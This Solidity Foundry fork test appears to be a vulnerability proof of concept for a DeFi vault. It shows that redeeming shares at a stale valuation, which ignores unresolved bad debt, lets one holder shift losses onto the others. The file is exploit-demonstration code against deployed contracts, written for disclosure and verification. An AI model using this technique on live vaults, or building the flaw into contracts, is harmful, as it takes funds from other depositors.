// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC4626} from "@openzeppelin/contracts/interfaces/IERC4626.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

interface IAccumulatedBadDebtVault is IERC4626 {
    function badDebtMapping(address collateral) external view returns (uint256);
    function pool() external view returns (IERC4626);
}

/// @notice Production-state proof for cross-user loss shifting from multiple already-realized,
/// unresolved bad-debt mappings. No settlement is synthesized in this test: it forks a real
/// post-settlement block, uses a real historical LP, and performs an ordinary ERC-4626 redeem.
/// Every collateral included must have zero vault balance, so the corresponding badDebtMapping
/// is an economically uncovered loss rather than an unvalued delivered-collateral claim.
contract TermMaxVaultAccumulatedBadDebtCrossUserPoC is Test {
    function testFork_RealMultiHolderState_RedeemShiftsAccumulatedUncoveredLoss() public {
        string memory rpc = vm.envString("MAINNET_RPC_URL");
        uint256 blockNumber = vm.envUint("TERM_MAX_POST_SETTLEMENT_BLOCK");
        vm.createSelectFork(rpc, blockNumber);

        address vaultAddress = vm.envAddress("TERM_MAX_VAULT");
        address attacker = vm.envAddress("TERM_MAX_SHARE_HOLDER");
        address[] memory collaterals = vm.envAddress("TERM_MAX_COLLATERALS", ",");
        uint256 expectedDeficit = vm.envUint("TERM_MAX_EXPECTED_TOTAL_UNCOVERED_BAD_DEBT_RAW");

        IAccumulatedBadDebtVault vault = IAccumulatedBadDebtVault(vaultAddress);
        IERC20 asset = IERC20(vault.asset());
        IERC4626 pool = vault.pool();

        uint256 attackerShares = vault.balanceOf(attacker);
        uint256 supplyBefore = vault.totalSupply();
        uint256 assetsBefore = vault.totalAssets();

        assertGt(attackerShares, 0, "selected historical LP has zero shares");
        assertGt(supplyBefore, attackerShares, "selected LP is the only share holder");
        assertGt(collaterals.length, 0, "no bad-debt collaterals supplied");

        uint256[] memory mappingBefore = new uint256[](collaterals.length);
        uint256 totalUncovered;
        for (uint256 i; i < collaterals.length; ++i) {
            address collateral = collaterals[i];
            uint256 badDebt = vault.badDebtMapping(collateral);
            uint256 collateralBalance = IERC20(collateral).balanceOf(vaultAddress);
            assertGt(badDebt, 0, "listed collateral has no unresolved bad debt");
            assertEq(collateralBalance, 0, "listed bad debt is backed by delivered collateral in vault");
            mappingBefore[i] = badDebt;
            totalUncovered += badDebt;
        }
        assertEq(totalUncovered, expectedDeficit, "active uncovered deficit differs from scanned production state");
        assertGt(totalUncovered, 0, "no uncovered realized loss");
        assertLt(totalUncovered, assetsBefore, "deficit exceeds nominal assets");

        uint256 nominalPayout = vault.previewRedeem(attackerShares);
        uint256 economicAssetsBefore = assetsBefore - totalUncovered;
        uint256 fairEconomicPayout =
            Math.mulDiv(attackerShares, economicAssetsBefore + 1, supplyBefore + 1, Math.Rounding.Floor);
        uint256 crossUserLossShift = nominalPayout - fairEconomicPayout;
        assertGt(crossUserLossShift, 0, "integer rounding neutralizes cross-user loss shift");

        uint256 liquidCapacity = asset.balanceOf(vaultAddress);
        if (address(pool) != address(0)) liquidCapacity += pool.maxWithdraw(vaultAddress);
        assertGe(liquidCapacity, nominalPayout, "real production liquidity cannot fund ordinary redeem");

        uint256 attackerAssetBefore = asset.balanceOf(attacker);
        vm.prank(attacker);
        uint256 assetsOut = vault.redeem(attackerShares, attacker, attacker);

        assertEq(assetsOut, nominalPayout, "ordinary redeem did not pay nominal stale-NAV quote");
        assertEq(asset.balanceOf(attacker) - attackerAssetBefore, nominalPayout, "attacker did not receive liquid asset");

        for (uint256 i; i < collaterals.length; ++i) {
            assertEq(vault.badDebtMapping(collaterals[i]), mappingBefore[i], "redeem unexpectedly retired bad debt");
            assertEq(IERC20(collaterals[i]).balanceOf(vaultAddress), 0, "redeem unexpectedly acquired/consumed collateral");
        }

        uint256 actualRemainingEconomicAssets = vault.totalAssets() - totalUncovered;
        uint256 fairRemainingEconomicAssets = economicAssetsBefore - fairEconomicPayout;
        uint256 additionalLossForcedOnOtherShares = fairRemainingEconomicAssets - actualRemainingEconomicAssets;
        assertApproxEqAbs(
            additionalLossForcedOnOtherShares,
            crossUserLossShift,
            2,
            "exiter's excess payout is not conserved as additional loss to other shares"
        );

        emit log_named_uint("historical block", blockNumber);
        emit log_named_address("vault", vaultAddress);
        emit log_named_address("real exiting LP", attacker);
        emit log_named_uint("other shares remaining raw", supplyBefore - attackerShares);
        emit log_named_uint("active uncovered bad debt raw", totalUncovered);
        emit log_named_uint("ordinary redeem payout raw", nominalPayout);
        emit log_named_uint("fair economic payout raw", fairEconomicPayout);
        emit log_named_uint("cross-user loss shifted raw", crossUserLossShift);
        emit log_named_uint("additional loss on remaining shares raw", additionalLossForcedOnOtherShares);
    }
}
